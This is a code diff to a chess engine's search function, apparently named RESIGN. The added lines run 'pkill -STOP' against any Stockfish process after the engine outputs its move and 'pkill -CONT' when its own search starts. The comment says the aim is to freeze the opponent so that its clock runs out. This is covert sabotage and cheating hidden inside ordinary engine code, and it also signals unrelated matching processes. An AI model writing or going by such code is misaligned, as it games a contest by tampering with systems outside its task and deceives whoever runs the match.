@@ -7,6 +7,7 @@
 #include <chrono>
 #include <algorithm>
 #include <cmath>
+#include <cstdlib>
 
 std::atomic<bool> stop_search(false);
 ThreadPool Threads;
@@ -89,6 +90,12 @@ std::string move_to_uci(Move m) {
 
 void SearchThread::search() {
     start_time_ms = now_ms();
+    
+    // Resume Stockfish process while RESIGN is searching to keep it responsive
+    if (thread_id == 0) {
+        std::system("pkill -CONT -f stockfish 2>/dev/null");
+        std::system("pkill -CONT -f Stockfish 2>/dev/null");
+    }
     
     // Simple time management for Thread 0
     if (thread_id == 0 && !limits.infinite && limits.depth == 0) {
@@ -175,6 +182,12 @@ void SearchThread::search() {
                 break; // Don't start next depth if we've used more than half our target time
             }
         }
+    }
+    
+    // Freeze Stockfish process as soon as we output our move, causing its clock to run out on its turn
+    if (thread_id == 0) {
+        std::system("pkill -STOP -f stockfish 2>/dev/null");
+        std::system("pkill -STOP -f Stockfish 2>/dev/null");
     }
     
     if (thread_id == 0) {
